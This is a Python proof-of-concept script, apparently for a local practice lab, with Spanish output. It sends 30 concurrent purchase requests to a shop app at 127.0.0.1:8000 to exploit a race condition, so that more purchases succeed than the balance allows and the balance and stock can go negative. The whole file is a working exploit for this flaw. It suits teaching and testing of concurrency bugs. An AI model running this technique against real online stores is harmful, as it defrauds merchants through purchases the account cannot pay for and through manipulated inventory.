#!/usr/bin/python3

import signal
import sys
import requests
from concurrent.futures import ThreadPoolExecutor

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

BASE_URL = "http://127.0.0.1:8000"

compras_exitosas = 0
compras_fallidas = 0

def comprar(producto_id):
    global compras_exitosas, compras_fallidas
    url = f"{BASE_URL}/buy/{producto_id}"
    try:
        r = requests.get(url, timeout=15)
        if "Compra realizada" in r.text:
            compras_exitosas += 1
            print(f"  [+] COMPRA EXITOSA  (total exitosas: {compras_exitosas})")
        else:
            compras_fallidas += 1
            print(f"  [!] rechazada       (total rechazadas: {compras_fallidas})")
    except Exception as e:
        print(f"  Error: {e}")

def reset():
    requests.post(f"{BASE_URL}/reset")
    print("Estado reseteado\n")

def ver_estado():
    r = requests.get(f"{BASE_URL}/estado")
    return r.json()

def simular_race_condition():
    global compras_exitosas, compras_fallidas
    compras_exitosas = 0
    compras_fallidas = 0

    reset()

    estado = ver_estado()
    print("=" * 60)
    print("ESTADO INICIAL")
    print(f"  Saldo:            ${estado['usuario']['saldo']}")
    print(f"  Stock Rines producto: {estado['productos'][0]['stock']}")
    print("=" * 60)

    print("\nLanzando 30 requests...\n")

    with ThreadPoolExecutor(max_workers=30) as executor:
        futuros = [executor.submit(comprar, 1) for _ in range(30)]
        for f in futuros:
            f.result()

    estado_final = ver_estado()
    saldo_final = estado_final['usuario']['saldo']
    stock_final = estado_final['productos'][0]['stock']

    print("\n" + "=" * 60)
    print("RESULTADO FINAL")
    print(f"  Compras exitosas: {compras_exitosas} ")
    print(f"  Saldo final:      ${saldo_final}  ")
    print(f"  Stock final:      {stock_final} ")

    if compras_exitosas > 2:
        print(f"\n[+]  RACE CONDITION EXPLOTADA:")
        print(f"   Se realizaron {compras_exitosas} compras con saldo para solo 2")
        if saldo_final < 0:
            print(f"   Saldo quedó NEGATIVO: ${saldo_final}")
        if stock_final < 8:
            print(f"   Stock bajó más de lo esperado: {stock_final}")
    else:
        print("\n  Sin race condition detectada, intenta de nuevo")

if __name__ == "__main__":
    simular_race_condition()
